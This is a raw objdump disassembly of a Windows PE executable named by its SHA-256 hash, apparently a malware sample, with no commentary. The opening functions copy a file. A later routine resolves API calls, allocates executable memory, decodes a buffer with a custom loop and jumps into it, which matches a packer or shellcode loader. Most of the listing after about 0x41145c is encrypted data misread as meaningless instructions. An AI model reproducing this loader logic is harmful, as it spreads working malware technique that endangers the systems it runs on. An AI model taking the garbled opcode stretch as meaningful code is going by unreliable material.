
9a27efa3ebcb6f73d642f95f4a0f59e9749f38e843db3f2fc4a628660d4d297e.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0xb502abc6
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	jl     0x411475
  41145c:	jmp    0x877cb3c6
  411461:	inc    ebx
  411462:	test   BYTE PTR [edx+ecx*4+0x1e],dl
  411466:	das    
  411467:	sti    
  411468:	shl    eax,1
  41146a:	sahf   
  41146b:	into   
  41146c:	inc    ecx
  41146d:	jg     0x411447
  41146f:	scas   al,BYTE PTR es:[edi]
  411470:	pop    esi
  411471:	push   0x15
  411473:	stos   BYTE PTR es:[edi],al
  411474:	pusha  
  411475:	xchg   edi,eax
  411476:	cmp    dl,BYTE PTR [ecx]
  411478:	and    BYTE PTR ss:[edx+0x18],0xd6
  41147d:	sti    
  41147e:	out    dx,al
  41147f:	test   BYTE PTR [ebp-0x41],dl
  411482:	out    0x13,al
  411484:	mov    dl,0x32
  411486:	xlat   BYTE PTR ds:[ebx]
  411487:	add    eax,0xc78ba91f
  41148c:	jbe    0x41149d
  41148e:	dec    ebx
  41148f:	mov    ebx,0x2130fd58
  411494:	fsubr  QWORD PTR [ebp-0x170e95f8]
  41149a:	mov    al,BYTE PTR [ebx+0x7b]
  41149d:	or     ebp,eax
  41149f:	rol    esi,0x43
  4114a2:	scas   eax,DWORD PTR es:[edi]
  4114a3:	push   esi
  4114a4:	push   0xd77005e7
  4114a9:	adc    ebx,DWORD PTR [edx+0x23]
  4114ac:	aas    
  4114ad:	enter  0x1fd2,0x1c
  4114b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b2:	imul   ebp,eax,0xffffffa6
  4114b5:	pusha  
  4114b6:	rol    DWORD PTR [ecx-0x34418f82],cl
  4114bc:	orps   xmm0,XMMWORD PTR [ebp-0x130fa913]
  4114c3:	dec    esi
  4114c4:	mov    cl,0x29
  4114c6:	std    
  4114c7:	push   DWORD PTR [ecx+0x6c804e58]
  4114cd:	jmp    0x41146a
  4114cf:	(bad)  
  4114d0:	je     0x41151e
  4114d2:	mov    edi,DWORD PTR [edi-0x15bbb398]
  4114d8:	jno    0x411480
  4114da:	(bad)  
  4114dc:	repz mov edi,0xa330ca5d
  4114e2:	jno    0x411504
  4114e4:	into   
  4114e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e6:	cmp    edi,DWORD PTR ds:0xf9ee271f
  4114ec:	xor    BYTE PTR [ebx],ah
  4114ee:	xor    ebp,DWORD PTR [edi+0x48]
  4114f1:	xchg   esp,eax
  4114f2:	ret    0xd19b
  4114f5:	mov    bh,0x84
  4114f7:	xlat   BYTE PTR ds:[ebx]
  4114f8:	call   esp
  4114fa:	sbb    ebx,esi
  4114fc:	push   esi
  4114fd:	fimul  WORD PTR [esi+0x45]
  411500:	nop
  411501:	pop    es
  411502:	dec    esi
  411503:	jmp    0x43d05740
  411508:	(bad)  
  411509:	xor    dh,dh
  41150b:	mov    eax,ds:0xc05fb7b4
  411510:	pop    edx
  411511:	fcom   QWORD PTR [ebx]
  411513:	or     ebx,esp
  411515:	dec    edx
  411516:	or     DWORD PTR [ecx],eax
  411518:	push   0xfffffff8
  41151a:	sahf   
  41151b:	imul   ebp,DWORD PTR ds:0xe4d15027,0x68
  411522:	out    dx,eax
  411523:	fs jmp 0xda506d30
  411529:	cld    
  41152a:	or     eax,0xa4a8396e
  41152f:	test   dl,bl
  411531:	sub    esi,esp
  411533:	inc    edx
  411534:	mov    ebp,0x9db1b58d
  411539:	sub    DWORD PTR [ebp-0xc3d8528],eax
  41153f:	(bad)  
  411540:	sub    eax,DWORD PTR [esi+ebp*2-0x6b]
  411544:	mov    edi,0x6e7b41a
  411549:	mov    WORD PTR [ecx],es
  41154b:	int3   
  41154c:	fidivr DWORD PTR [ecx-0x6f41856d]
  411552:	ror    cl,0x85
  411555:	out    dx,eax
  411556:	xchg   esp,eax
  411557:	(bad)  
  411559:	push   edx
  41155a:	loop   0x4115a6
  41155c:	push   es
  41155d:	push   edx
  41155e:	push   eax
  41155f:	mov    eax,ds:0x5637c367
  411564:	and    eax,0xe39ae144
  411569:	into   
  41156a:	mov    bh,0xd8
  41156c:	lods   eax,DWORD PTR ds:[esi]
  41156d:	pop    ss
  41156e:	mov    eax,0x13fd08e0
  411573:	fisttp WORD PTR [esi+0x1cbf8f0c]
  411579:	pop    ebp
  41157a:	push   es
  41157b:	das    
  41157c:	fisubr DWORD PTR [edx]
  41157e:	xchg   ecx,eax
  41157f:	push   ecx
  411580:	push   0xfb60a73
  411585:	push   es
  411586:	lods   al,BYTE PTR ds:[esi]
  411587:	sub    ah,BYTE PTR [edi+ecx*8-0x5a53154a]
  41158e:	sub    al,0x57
  411590:	mov    ecx,esi
  411592:	xchg   esp,eax
  411593:	add    ah,BYTE PTR [edi-0x3a]
  411596:	lea    ebp,[ebx-0x71a525be]
  41159c:	cmp    ebp,DWORD PTR [ebx-0x53011ddb]
  4115a2:	cmp    BYTE PTR [ecx+edx*8],bl
  4115a5:	sub    edi,DWORD PTR [esi-0x46]
  4115a8:	out    0x28,ax
  4115ab:	mov    esp,gs
  4115ad:	ins    BYTE PTR es:[edi],dx
  4115ae:	mov    edx,DWORD PTR [ebp+0x2e0c5e1d]
  4115b4:	sar    BYTE PTR [ebp-0x1e50d877],1
  4115ba:	xchg   edx,eax
  4115bb:	popf   
  4115bc:	fadd   DWORD PTR [edx+0x5a]
  4115bf:	or     DWORD PTR [edi-0x5c775073],0x2a
  4115c6:	pop    ebx
  4115c7:	fwait
  4115c8:	pop    ss
  4115c9:	jmp    0x87ea:0x63fd2419
  4115d0:	pusha  
  4115d1:	push   ss
  4115d2:	push   ecx
  4115d3:	pandn  mm0,QWORD PTR [edi]
  4115d6:	out    0x6a,eax
  4115d8:	test   BYTE PTR [ecx],cl
  4115da:	sub    BYTE PTR [ebp-0x43e7b2af],dh
  4115e0:	ins    BYTE PTR es:[edi],dx
  4115e1:	aad    0x91
  4115e3:	adc    ebx,eax
  4115e5:	sbb    ecx,eax
  4115e7:	jo     0x4115c1
  4115e9:	sbb    BYTE PTR [eax-0x1d],dh
  4115ec:	push   ecx
  4115ed:	daa    
  4115ee:	mov    bl,0xa7
  4115f0:	jl     0x41164d
  4115f2:	mov    BYTE PTR [ebx+0x45],ah
  4115f5:	stos   DWORD PTR es:[edi],eax
  4115f6:	es push esp
  4115f8:	xchg   BYTE PTR [ebp+0x3f],dl
  4115fb:	jecxz  0x4115c2
  4115fd:	inc    eax
  4115fe:	cli    
  4115ff:	bound  esp,QWORD PTR [ecx-0x16f53ba1]
  411605:	mov    ebx,0x80c8b284
  41160a:	cli    
  41160b:	stc    
  41160c:	das    
  41160d:	mov    esi,0xb2a64c8a
  411612:	test   BYTE PTR [ebp-0x2c],0x62
  411616:	aas    
  411617:	leave  
  411618:	cmp    DWORD PTR [esi+eiz*1],eax
  41161b:	pop    edx
  41161c:	cdq    
  41161d:	(bad)  
  41161e:	into   
  41161f:	mov    cl,0x1c
  411621:	mov    cl,0x64
  411623:	test   eax,0x66a821c
  411628:	mov    bh,0xb9
  41162a:	repnz mov esi,0x80affb3b
  411630:	lock ins DWORD PTR es:[edi],dx
  411632:	jge    0x4115d1
  411634:	popf   
  411635:	mov    al,ds:0x5f9d5f77
  41163a:	dec    ebx
  41163b:	jmp    0xc9dee293
  411640:	outs   dx,BYTE PTR ds:[esi]
  411641:	sahf   
  411642:	dec    ecx
  411643:	adc    dh,dl
  411645:	(bad)  
  411647:	sub    eax,0x4333af6d
  41164c:	outs   dx,BYTE PTR ds:[esi]
  41164d:	jbe    0x4115f3
  41164f:	loope  0x411610
  411651:	push   ebp
  411652:	push   esp
  411653:	test   al,0x7c
  411655:	test   al,0xba
  411657:	es mov bh,0x63
  41165a:	push   edx
  41165b:	cmp    cl,BYTE PTR [edx]
  41165d:	aaa    
  41165e:	sub    DWORD PTR [esi],0x8f1361b
  411664:	test   eax,0x193f6a37
  411669:	mov    ebp,0xf6de4a5e
  41166e:	int3   
  41166f:	ret    
  411670:	les    ebp,FWORD PTR [edx+0x4a]
  411673:	ins    BYTE PTR es:[edi],dx
  411674:	ins    BYTE PTR es:[edi],dx
  411675:	xchg   dl,dh
  411677:	inc    ecx
  411678:	cmp    DWORD PTR [eax],esi
  41167a:	mov    ch,0x8f
  41167c:	in     al,dx
  41167d:	addr16 das 
  41167f:	dec    ebp
  411680:	cmp    al,0xca
  411682:	gs ss jno 0x411655
  411686:	loopne 0x41167e
  411688:	addr16 je 0x41164c
  41168b:	jb     0x41164d
  41168d:	fsubr  st,st(6)
  41168f:	or     DWORD PTR [edi],edi
  411691:	sub    DWORD PTR [eax+0x22aa3d14],esp
  411697:	mov    eax,ds:0x5c7bc93a
  41169c:	scas   al,BYTE PTR es:[edi]
  41169d:	add    DWORD PTR [ebp+ecx*1-0x19],0xffffff95
  4116a2:	pushf  
  4116a3:	stc    
  4116a4:	loopne 0x411673
  4116a6:	add    DWORD PTR [eax+0x1c1601ac],esi
  4116ac:	in     eax,dx
  4116ad:	repnz push ds
  4116af:	loop   0x4116bf
  4116b1:	stos   BYTE PTR es:[edi],al
  4116b2:	push   cs
  4116b3:	jae    0x411682
  4116b5:	dec    edx
  4116b6:	je     0x41168b
  4116b8:	and    ebp,edi
  4116ba:	push   esp
  4116bb:	mov    bh,0xe2
  4116bd:	iret   
  4116be:	fnstenv [esi-0x7a6a5759]
  4116c4:	mov    dl,0xed
  4116c6:	push   ebx
  4116c7:	fcom   DWORD PTR [ebx+0x74cfc83f]
  4116cd:	jo     0x411743
  4116cf:	mov    al,0x48
  4116d1:	mov    edi,0x812a49dc
  4116d6:	push   esp
  4116d7:	jae    0x411719
  4116d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116da:	ret    
  4116db:	out    dx,al
  4116dc:	in     eax,dx
  4116dd:	pop    esp
  4116de:	int    0xbe
  4116e0:	in     al,dx
  4116e1:	or     DWORD PTR [edi-0x4e86e898],esi
  4116e7:	mov    esp,0x3ef9621e
  4116ec:	pop    esp
  4116ed:	scas   eax,DWORD PTR es:[edi]
  4116ee:	sbb    BYTE PTR [edx],ch
  4116f0:	mov    eax,ds:0xa9676728
  4116f5:	(bad)  
  4116f6:	in     al,dx
  4116f7:	imul   eax,DWORD PTR [ebx],0x3e
  4116fa:	in     eax,dx
  4116fb:	mov    ds:0xea18d6e0,eax
  411700:	scas   eax,DWORD PTR es:[edi]
  411701:	mov    bh,0x67
  411703:	(bad)  [eax-0x1f977a04]
  411709:	cmp    eax,DWORD PTR [eax+0xbc3e2fb]
  41170f:	or     eax,0xaec58936
  411714:	cmc    
  411715:	adc    BYTE PTR [eax+0xe5b55ad],0x14
  41171c:	pushf  
  41171d:	mov    dh,BYTE PTR [ebx]
  41171f:	sbb    BYTE PTR [esi],ch
  411721:	mov    dh,0x14
  411723:	fs jmpw 0x2847
  411728:	aaa    
  411729:	pop    eax
  41172a:	cmc    
  41172b:	test   eax,0xe6779958
  411730:	aas    
  411731:	das    
  411732:	cwde   
  411733:	mov    ch,0x8f
  411735:	jle    0x4116d6
  411737:	lea    ebx,[ecx-0x362b7fed]
  41173d:	std    
  41173e:	push   0xad4965bd
  411743:	add    ecx,ebp
  411745:	fs inc ecx
  411747:	sub    DWORD PTR [ebx],0xffffffa3
  41174a:	pop    ds
  41174b:	pop    ebx
  41174c:	lds    edi,FWORD PTR [esi+0x63]
  41174f:	outs   dx,BYTE PTR ds:[esi]
  411750:	mov    bh,0x1d
  411752:	mov    eax,ds:0xeed31a4e
  411757:	rol    DWORD PTR [eax],1
  411759:	xor    cl,BYTE PTR ds:0x1cdac007
  41175f:	shr    DWORD PTR [ebx],cl
  411761:	call   0x6788:0x13bee8ce
  411768:	dec    esi
  411769:	mov    esi,edx
  41176b:	test   BYTE PTR [eax],ah
  41176d:	add    eax,DWORD PTR [edi]
  41176f:	push   ecx
  411770:	out    dx,eax
  411771:	push   edx
  411772:	scas   eax,DWORD PTR es:[edi]
  411773:	ins    BYTE PTR es:[edi],dx
  411774:	inc    edi
  411775:	mov    al,ds:0x8f88f322
  41177a:	shl    BYTE PTR [ecx+0x5a],1
  41177d:	xchg   ah,ah
  41177f:	call   0xc1b7:0x7e7ca74c
  411786:	xor    DWORD PTR ds:[esi+ebx*4],ebp
  41178a:	add    eax,0xc72ed527
  41178f:	sbb    ch,BYTE PTR [edi+0x7]
  411792:	hlt    
  411793:	inc    ebp
  411794:	pop    ebx
  411795:	(bad)  
  411796:	in     al,dx
  411797:	xchg   esp,eax
  411798:	bnd ret 
  41179a:	scas   al,BYTE PTR es:[edi]
  41179b:	jecxz  0x4117f5
  41179d:	mov    ecx,ebx
  41179f:	in     eax,dx
  4117a0:	cld    
  4117a1:	mov    al,ds:0xf3ab8d
  4117a6:	ins    BYTE PTR es:[edi],dx
  4117a7:	jbe    0x41179e
  4117a9:	dec    DWORD PTR [ebx-0x79]
  4117ac:	xor    bh,BYTE PTR [ebx-0x78b75a7]
  4117b2:	cld    
  4117b3:	adc    esp,DWORD PTR [edx-0x42]
  4117b6:	or     bl,BYTE PTR [eax+0x6b036a74]
  4117bc:	aas    
  4117bd:	add    eax,0x5c78e65b
  4117c2:	shl    DWORD PTR [ebp-0x7a],0x78
  4117c6:	dec    edx
  4117c7:	ins    BYTE PTR es:[edi],dx
  4117c8:	data16 add dh,bh
  4117cb:	cmp    DWORD PTR [eax],ecx
  4117cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117ce:	xor    eax,0xb599be9b
  4117d3:	mov    ebp,0xa4e5318e
  4117d8:	call   0xc2773540
  4117dd:	test   eax,0x15c9434a
  4117e2:	repnz mov al,0x8c
  4117e5:	push   ebx
  4117e6:	mov    edi,0x7e0324d8
  4117eb:	mul    DWORD PTR ds:0xf57cc7da
  4117f1:	or     BYTE PTR [eax+0x5e],ah
  4117f4:	repnz add dl,dh
  4117f7:	jo     0x411805
  4117f9:	out    dx,eax
  4117fa:	xor    al,0xc8
  4117fc:	push   ds
  4117fd:	sub    al,0xf5
  4117ff:	std    
  411800:	dec    si
  411802:	retf   0xe41c
  411805:	pop    esi
  411806:	popf   
  411807:	(bad)  
  411809:	jle    0x411831
  41180b:	xchg   esp,eax
  41180c:	stos   DWORD PTR es:[edi],eax
  41180d:	inc    edi
  41180e:	jne    0x411793
  411810:	fadd   st,st(5)
  411812:	in     al,dx
  411813:	push   ebp
  411814:	inc    ebx
  411815:	dec    esi
  411816:	dec    ebx
  411817:	shr    ebx,1
  411819:	cmp    ebp,DWORD PTR [eax]
  41181b:	fisttp DWORD PTR [esi+eiz*4]
  41181e:	adc    dh,BYTE PTR [ebx-0x51]
  411821:	jl     0x41189a
  411823:	mov    esp,esp
  411825:	pop    ss
  411826:	sub    bl,BYTE PTR [edx]
  411828:	neg    DWORD PTR [esi]
  41182a:	push   ds
  41182b:	pop    esi
  41182c:	fwait
  41182d:	(bad)  
  41182e:	adc    eax,0x83773b0b
  411833:	mov    edi,0x3a781fd7
  411838:	xor    ebp,DWORD PTR [edx+0x23]
  41183b:	mov    esp,0x6418c2f4
  411840:	push   eax
  411841:	outs   dx,BYTE PTR ds:[esi]
  411842:	inc    edx
  411843:	dec    esp
  411844:	push   0xce245d4b
  411849:	lahf   
  41184a:	div    BYTE PTR [edi+0x7a]
  41184d:	adc    eax,0xa3cdee
  411852:	sub    eax,0x6665d6b4
  411857:	mov    al,ds:0xa85a0043
  41185c:	push   edx
  41185d:	and    al,0xbe
  41185f:	pop    ecx
  411860:	mov    ebx,DWORD PTR [ebp-0x1840066e]
  411866:	add    al,0x8a
  411868:	lods   al,BYTE PTR ds:[esi]
  411869:	div    ecx
  41186b:	and    BYTE PTR [esi+eiz*4-0x5abc712a],0xae
  411873:	shl    dl,cl
  411875:	fwait
  411876:	aaa    
  411877:	outs   dx,BYTE PTR ds:[esi]
  411878:	ret    
  411879:	push   ss
  41187a:	inc    ecx
  41187b:	in     al,dx
  41187c:	xor    al,0x2c
  41187e:	popf   
  41187f:	xor    DWORD PTR [eax],edi
  411881:	call   0x96bca56e
  411886:	clc    
  411887:	fucomi st,st(5)
  411889:	and    dl,BYTE PTR [esi]
  41188b:	fcomp  QWORD PTR [esp]
  41188e:	ja     0x4118ab
  411890:	(bad)  
  411891:	ins    BYTE PTR es:[edi],dx
  411892:	clc    
  411893:	add    al,0xb9
  411895:	push   edi
  411896:	cmp    DWORD PTR [ebx],edi
  411898:	out    dx,al
